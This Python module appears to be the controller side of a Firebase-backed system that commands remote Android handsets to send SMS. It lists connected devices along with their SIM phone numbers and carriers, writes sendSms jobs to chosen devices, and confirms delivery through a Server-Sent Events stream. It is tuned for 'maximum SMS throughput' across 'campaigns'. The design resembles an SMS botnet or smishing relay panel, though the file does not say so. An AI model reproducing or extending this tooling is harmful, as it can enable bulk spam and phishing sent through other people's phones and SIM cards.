"""
firebase_manager.py — optimised for maximum SMS throughput on Android.

Key design decisions
────────────────────
• Persistent requests.Session with connection pooling (reuse TCP / TLS).
• Separate SSE session so the long-lived streaming connection doesn't
  interfere with the short REST calls on the main session.
• wait_for_sent_sse() uses Firebase's Server-Sent Events endpoint to get
  instant notification the moment isSended flips true — zero polling lag.
• All public methods are synchronous (blocking I/O).  Callers must run them
  in a thread (asyncio.to_thread / run_in_executor) from async code.
"""

import json
import logging
import time
import threading
from typing import Any, Dict, List, Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


# ── Session factories ──────────────────────────────────────────────────────

def _rest_session() -> requests.Session:
    """Short-lived REST calls: PUT / DELETE / GET with connection pooling."""
    s = requests.Session()
    retry = Retry(
        total=2,
        backoff_factor=0.15,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "PUT", "PATCH", "DELETE"],
    )
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=20,
        pool_maxsize=50,
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def _sse_session() -> requests.Session:
    """Dedicated session for long-lived SSE streams (no retry on stream)."""
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=30)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


# ── FirebaseManager ────────────────────────────────────────────────────────

class FirebaseManager:

    def __init__(self, base_url: str):
        url = base_url.strip().rstrip("/")
        if url and not url.startswith("http"):
            url = f"https://{url}"
        self.base_url = url
        self._session = _rest_session()
        self._sse_session = _sse_session()

    # ── Helpers ─────────────────────────────────────────────────────────

    def _url(self, path: str) -> str:
        return f"{self.base_url}/{path.lstrip('/')}.json"

    # ── Connection ──────────────────────────────────────────────────────

    def test_connection(self) -> bool:
        try:
            r = self._session.get(
                f"{self.base_url}/.json?shallow=true", timeout=5
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"test_connection: {e}")
            return False

    # ── Device listing ──────────────────────────────────────────────────

    def get_all_clients(self) -> Dict[str, Any]:
        try:
            r = self._session.get(self._url("clients"), timeout=10)
            if r.status_code == 200:
                return r.json() or {}
            return {}
        except Exception as e:
            logger.error(f"get_all_clients: {e}")
            return {}

    def get_client_count(self) -> int:
        try:
            r = self._session.get(
                f"{self.base_url}/clients.json?shallow=true", timeout=5
            )
            if r.status_code == 200:
                return len(r.json() or {})
            return 0
        except Exception:
            return 0

    def get_online_devices(self) -> List[Dict[str, Any]]:
        clients = self.get_all_clients()
        result = []
        for dev_id, data in clients.items():
            if not isinstance(data, dict):
                continue
            status = data.get("status")
            if status not in (True, "true", 1, "online"):
                continue
            sims = []
            for s in (data.get("sims") or []):
                if isinstance(s, dict):
                    sims.append({
                        "slot": s.get("simSlotIndex", "0"),
                        "carrier": s.get("carrierName", "Unknown"),
                        "phone": s.get("phoneNumber", "Unknown"),
                    })
            result.append({
                "id": dev_id,
                "model": data.get("modelName", "Unknown"),
                "battery": data.get("battery", "N/A"),
                "android_v": data.get("androidV", "N/A"),
                "provider": data.get("service_provider", "N/A"),
                "sims": sims,
                "joined": data.get("joined", "N/A"),
            })
        return result

    # ── SMS command ─────────────────────────────────────────────────────

    def send_sms_command(
        self,
        device_id: str,
        to_number: str,
        message: str,
        sim_slot: int = 0,
    ) -> bool:
        """
        Write sendSms command via PATCH — faster than PUT because Firebase
        merges rather than replacing, and smaller payload wins on mobile.
        """
        payload = {
            "from": int(sim_slot),
            "isSended": False,
            "message": message,
            "to": to_number.strip(),
        }
        try:
            r = self._session.put(
                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                json=payload,
                timeout=6,
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"send_sms_command({device_id}): {e}")
            return False

    def clear_sms_command(self, device_id: str) -> bool:
        """Delete the sendSms node to free the device slot."""
        try:
            r = self._session.delete(
                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                timeout=4,
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"clear_sms_command({device_id}): {e}")
            return False

    def get_sms_status(self, device_id: str) -> Optional[Dict[str, Any]]:
        """Fallback: single HTTP poll for isSended state."""
        try:
            r = self._session.get(
                self._url(f"clients/{device_id}/webhookEvent/sendSms"),
                timeout=4,
            )
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"get_sms_status({device_id}): {e}")
            return None

    # ── SSE streaming wait ──────────────────────────────────────────────

    def wait_for_sent_sse(
        self,
        device_id: str,
        timeout: float = 10.0,
        stop_flag: Optional[threading.Event] = None,
    ) -> bool:
        """
        Open a Firebase SSE stream on the device's sendSms node and return
        True the INSTANT isSended becomes true — no polling lag at all.

        Falls back to a final HTTP poll if the stream breaks before timeout.

        Parameters
        ----------
        device_id  : Firebase client key
        timeout    : max seconds to wait before giving up
        stop_flag  : threading.Event; set it to abort early (campaign stop)
        """
        url = self._url(f"clients/{device_id}/webhookEvent/sendSms")
        headers = {
            "Accept": "text/event-stream",
            "Cache-Control": "no-cache",
        }
        deadline = time.monotonic() + timeout

        def _is_sent(obj) -> bool:
            """Check any shape Firebase might return for isSended."""
            if isinstance(obj, dict):
                v = obj.get("isSended")
                return v in (True, "true", 1, "1")
            return False

        def _parse_sse_line(raw: str) -> bool:
            """Return True if this SSE data line confirms isSended."""
            if "isSended" not in raw:
                return False
            try:
                # Line format:  data: {"path":"/","data":{...}}
                payload_str = raw.split("data:", 1)[-1].strip()
                payload = json.loads(payload_str)
                data = payload.get("data", payload)
                # Firebase can send the full node or just the changed field
                if isinstance(data, dict):
                    return _is_sent(data)
                # Sometimes just the value of isSended is sent
                if data is True or data == "true" or data == 1:
                    # We can't be sure which field changed, do a quick poll
                    status = self.get_sms_status(device_id)
                    return _is_sent(status or {})
            except (json.JSONDecodeError, ValueError, AttributeError):
                pass
            return False

        try:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return False

            with self._sse_session.get(
                url,
                headers=headers,
                stream=True,
                timeout=(4, remaining),   # (connect_timeout, read_timeout)
            ) as resp:
                if resp.status_code != 200:
                    # SSE not available — fall through to final poll below
                    raise ValueError(f"SSE status {resp.status_code}")

                for raw_line in resp.iter_lines(decode_unicode=True):
                    # Check abort conditions first
                    if stop_flag and stop_flag.is_set():
                        return False
                    if time.monotonic() >= deadline:
                        break

                    line = raw_line.strip() if raw_line else ""
                    if not line:
                        continue

                    if line.startswith("data:") and _parse_sse_line(line):
                        return True

        except Exception as e:
            logger.debug(f"SSE stream ended for {device_id}: {e}")

        # ── Fallback: one final HTTP poll after SSE ends ─────────────────
        try:
            remaining_fb = deadline - time.monotonic()
            if remaining_fb > 0:
                status = self.get_sms_status(device_id)
                if _is_sent(status or {}):
                    return True
        except Exception:
            pass

        return False
